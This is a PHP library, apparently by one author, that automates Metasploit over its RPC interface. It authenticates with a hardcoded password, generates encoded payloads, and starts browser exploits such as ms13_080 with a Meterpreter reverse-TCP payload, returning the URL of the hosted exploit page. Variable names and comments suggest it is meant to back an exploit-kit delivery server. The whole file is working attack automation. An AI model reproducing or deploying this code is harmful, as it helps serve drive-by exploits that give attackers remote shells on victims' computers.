<?php #
/*
 * by Bryce Kunz
 *
 * ### ### ### ### ###
 *
 * This script:
 * - provides PHP functions to easily interface with metasploit
 * - interfaces with metasploit via Metasploit's RPC server (msfrpcd)
 *
 * ### ### ### ### ###
 *
 * How I Setup my Server:
 *
 * vi /etc/hosts
 * vi /etc/network/interfaces
 * 
 * update-rc.d ssh enable
 * service ssh start
 * 
 * apt-get install gcc make linux-headers-$(uname -r)
 * ln -s /usr/src/linux-headers-$(uname -r)/include/generated/uapi/linux/version.h /usr/src/linux-headers-$(uname -r)/include/linux/
 * 
 * apt-get install php5-dev php-pear build-essential
 * 
 * pecl install channel://pecl.php.net/msgpack-0.5.5
 * 
 * echo "extension=msgpack.so" >> /etc/php5/apache2/php.ini
 * 
 * apt-get install curl libcurl3 libcurl3-dev php5-curl
 * 
 * update-rc.d postgresql enable
 * service postgresql start
 * 
 * update-rc.d metasploit enable
 * service metasploit start
 * 
 * update-rc.d apache2 enable
 * service apache2 restart
 *
 * ### ### ### ### ###
 *
 * How to use:
 * 
 * #1 - Start msfrpcd on a server:
 root@kali:~# ifconfig | grep 192.168.
    inet addr:192.168.192.234  Bcast:192.168.192.255  Mask:255.255.255.0
 root@kali:~# cat msgrpc.rc
    load msgrpc ServerHost=192.168.192.234 Pass=abc123
 root@kali:~# msfconsole -r /root/msgrpc.rc
 ...
 *
 * #2 - Inclucde php file and use functions.
 * This example will start the ms13-080 exploit:
 ...
 require_once ('includes/php_msfrpc_inc.php');
 ...
 $msfrpcd_ip = "192.168.192.234"
 $cb_ip = "192.168.192.234"
 $msf_exploit_full_path = "exploit/windows/browser/ms13_080_cdisplaypointer";
 $msf_payload_full_path = "windows/meterpreter/reverse_tcp";
 $msf_target = "3";
 $msf_url = use_exploit($msfrpcd_ip, $cb_ip, $msf_exploit_full_path, $msf_payload_full_path, $msf_target);
 ...
 *
 * ### ### ### ### ###
 * 
 */

require_once ('php_debug_inc.php');
//require_once('conf.php');

# Define Variables
define("WEBBOT_NAME", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6");
define("CURL_TIMEOUT", 30000);
define("COOKIE_FILE", "cookie.txt");

# Define Constants
define("HEAD", "HEAD");
define("GET",  "GET");
define("POST", "POST");

# DEFINE HEADER INCLUSION
define("EXCL_HEAD", FALSE);
define("INCL_HEAD", TRUE);
 
// ************ curl_post() ************ //
function curl_post($url, $port, $httpheader, $postfields)
{
    debug("START Function curl_post()");

    debug("url: " . $url);
    debug("port: " . $port);
    debug("httpheader: ");
    debug_r($httpheader);
    debug("postfields: ");
    debug_r($postfields);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_PORT , $port); 
    curl_setopt($ch, CURLOPT_VERBOSE, 0); 
    curl_setopt($ch, CURLOPT_HEADER, 0);
    
    curl_setopt($ch, CURLOPT_POST, TRUE); 
    curl_setopt($ch, CURLOPT_HTTPGET, FALSE); 
    curl_setopt($ch, CURLOPT_NOBODY, FALSE);
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader); 
    
    curl_setopt ($ch, CURLOPT_POSTFIELDS, $postfields);
    
    curl_setopt($ch, CURLOPT_TIMEOUT, CURL_TIMEOUT);    // Timeout
    curl_setopt($ch, CURLOPT_USERAGENT, WEBBOT_NAME);   // Webbot name
    curl_setopt($ch, CURLOPT_VERBOSE, FALSE);           // Minimize logs
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);    // No certificate
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);     // Follow redirects
    curl_setopt($ch, CURLOPT_MAXREDIRS, 4);             // Limit redirections to four
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     // Return in string
    
    $return_array['FILE']   = curl_exec($ch); 
    $return_array['STATUS'] = curl_getinfo($ch);
    $return_array['ERROR']  = curl_error($ch);
    
    debug("return_array['FILE']: ". $return_array['FILE']);
    debug("return_array['STATUS']: ");
    debug_r($return_array['STATUS']);
    debug("\n");
    debug("return_array['ERROR']: ". $return_array['ERROR']);
    
    curl_close($ch);
    
    debug("END Function curl_post()\n");
    return $return_array;
}

// ************  msf_auth() ************ //
function msf_auth($ip, $username = "msf", $password = "abc123")
{
	debug("START Function msf_auth()");
        
	$data = array("auth.login", $username, $password);
	
	$msgpack_data = msgpack_pack($data);
	
	$url = "http://".$ip.":55552/api/1.0";
	$port = 55552;
	$httpheader = array("Host: RPC Server", "Content-Length: ".strlen($msgpack_data), "Content-Type: binary/message-pack");
	$postfields = $msgpack_data;
	$return_array = curl_post($url, $port, $httpheader, $postfields);
	
	$msgunpack_data = msgpack_unpack($return_array['FILE']);
	
	$token = $msgunpack_data["token"];
	
	debug("END Function msf_auth()");
	return $token;
}

// ************ msf_cmd() ************ //
function msf_cmd($ip, $client_request)
{

    debug("START Function msf_cmd()");
    
    $msgpack_data = msgpack_pack($client_request);
    
    $url = "http://".$ip.":55552/api/1.0";
    $port = 55552;
    $httpheader = array("Host: RPC Server", "Content-Length: ".strlen($msgpack_data), "Content-Type: binary/message-pack");
    $postfields = $msgpack_data;
    $return_array = curl_post($url, $port, $httpheader, $postfields);
    
    $msgunpack_data = msgpack_unpack($return_array['FILE']);
    
    debug("END Function msf_cmd()");
    return $msgunpack_data;
}

// ************ msf_console() ************ //
function msf_console($ip, $token, $console_id, $cmd)
{
    debug("START Function msf_console()");

    debug('cmd: ' . $cmd);
    
    $client_request = array("console.write", $token, $console_id, $cmd . "\n");
    $server_write_response = msf_cmd($ip, $client_request);
    
    debug('$server_write_response: ');
    debug_r($server_write_response);
    debug('\n');
    
    debug('server_write_response["wrote"]: ' . $server_write_response["wrote"] . "\n");
    
    do
    {
        debug('start do while');
        
        $client_request = array("console.read", $token, $console_id);
        $server_read_response = msf_cmd($ip, $client_request);
        
        debug('server_read_response: ');
        debug_r($server_read_response);
        debug('\n');
        
        debug('server_read_response["data"]: ' . $server_read_response["data"] . "\n");
        debug('server_read_response["prompt"]: ' . $server_read_response["prompt"] . "\n");
        debug('server_read_response["busy"]: ' . $server_read_response["busy"] . "\n");
    
        debug('end do while');
    } while($server_read_response["busy"] == 1);
    
    debug("END Function msf_console()");
    return $server_read_response;
}

// ************ msf_execute() ************ //
function msf_execute($ip, $token, $cmd)
{
    $client_request = array("console.execute", $token, $console_id, $cmd . "\n");
    $server_write_response = msf_cmd($ip, $client_request);
}


function use_payload($ek_ip, $msf_payload, $msf_type, $msf_rhost, $msf_rport, $msf_lhost, $msf_lport, $msf_encoder, $file_name)
{
    $token = msf_auth($ek_ip);
   
    $client_request = array("core.version", $token);
    $server_response = msf_cmd($ek_ip, $client_request);
    
    $client_request = array("console.create", $token);
    $server_response = msf_cmd($ek_ip, $client_request);
    $console_id_one = $server_response["id"];
	
	$server_response = msf_console($ek_ip, $token, $console_id_one, "use " . $msf_payload);
	debug("msf_payload: " . $msf_payload);
	
	$server_response = msf_console($ek_ip, $token, $console_id_one, "set LHOST " . $msf_lhost);
	
	$server_response = msf_console($ek_ip, $token, $console_id_one, "set RHOST " . $msf_rhost);
	
	$server_response = msf_console($ek_ip, $token, $console_id_one, "set RPORT " . $msf_rport);
	
	$server_response = msf_console($ek_ip, $token, $console_id_one, "set LPORT " . $msf_lport);
	
	$server_response = msf_console($ek_ip, $token, $console_id_one, "set EXITFUNC thread");
	
	if($msf_type == "raw")
	{
		$tmp_file = "/tmp/" . (string)time();
		$server_response = msf_console($ek_ip, $token, $console_id_one, "generate -t " . $msf_type . " -f " . $tmp_file . " -b \\x00 -e " . $msf_encoder);		
		$server_response = msf_console($ek_ip, $token, $console_id_one, "cat " . $tmp_file . " | base64 -w 0 > " . $file_name);
		$server_response = msf_console($ek_ip, $token, $console_id_one, "rm " . $tmp_file);
	}
	else
	{
		$server_response = msf_console($ek_ip, $token, $console_id_one, "generate -t " . $msf_type . " -f " . $file_name . " -b \\x00 -e " . $msf_encoder);
	}
		
	return $server_response;
	
}

// ************ use_exploit() ************ //
function use_exploit($msgrpc_ip, $exploit_domain, $exploit_port, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option, $msf_uripath, $msf_ssl = 0)
{    
    debug("START Function use_exploit()");
    debug("msgrpc_ip: " . $msgrpc_ip);
    debug("exploit_domain: " . $exploit_domain);
    debug("exploit_port: " . $exploit_port);
    debug("msf_exploit_full_path: " . $msf_exploit_full_path);
    debug("msf_target: " . $msf_target);
    debug("msf_payload_full_path: " . $msf_payload_full_path);
    debug("msf_cmd_option: " . $msf_cmd_option);
    
    // WL_DOMAIN
    // EXPLOIT_DOMAIN
    // MSGRPC_IP

    $token = msf_auth($msgrpc_ip);
    
    $client_request = array("core.version", $token);
    $server_response = msf_cmd($msgrpc_ip, $client_request);
    
    $client_request = array("console.create", $token);
    $server_response = msf_cmd($msgrpc_ip, $client_request);
    $console_id_one = $server_response["id"];
    
    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "use " . $msf_exploit_full_path);
    //debug_r("server_response: " . $server_response);
    
    $msf_exploit_name = substr(strrchr($msf_exploit_full_path, "/"), 1 );
    debug("msf_exploit_name: " . $msf_exploit_name);
    
    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set URIPATH /" . $msf_uripath);
    //$server_response = msf_console($ek_ip, $token, $console_id_one, "set SRVPORT 80");
    
    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set SRVPORT " . $exploit_port);
    
    if($msf_ssl)
    {
	$server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set SSL true");
    }
    else
    {
	$server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set SSL false");
    }
    
    if($msf_target >= 0)
    {
	$server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set TARGET " . $msf_target);
    }
    
    // TODO: maybe remove when going live?
    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set Retries true");
    
    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set PAYLOAD " . $msf_payload_full_path);
    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, $msf_cmd_option);
    
    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "set DisablePayloadHandler true");
    
    //$server_response = msf_console($ek_ip, $token, $console_id_one, "set LHOST " . $cb_ip);
    //$server_response = msf_console($ek_ip, $token, $console_id_one, "set LPORT " . $cb_port);
    
    // // // $server_response = msf_console($ek_ip, $token, $console_id_one, "set InitialAutoRunScript migrate -f");
    //$server_response = msf_console($ek_ip, $token, $console_id_one, "set InitialAutoRunScript run post/windows/manage/migrate");
    
    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "exploit -j"); // use -j not -j -z
    $server_response = msf_console($msgrpc_ip, $token, $console_id_one, "show options");
    
    if($msf_ssl)
    {
	#$msf_url = 'https://' . $exploit_domain . '/' . $msf_exploit_name;
        $msf_url = 'http://' . $exploit_domain . '/' . $msf_uripath;
    }
    else
    {
	#$msf_url = 'http://' . $exploit_domain . '/' . $msf_exploit_name;
        $msf_url = 'http://' . $exploit_domain . '/' . $msf_uripath;
    }
    
    debug("msf_url: " . $msf_url);
    debug("END Function use_exploit()");
    
    return $msf_url;
}

?>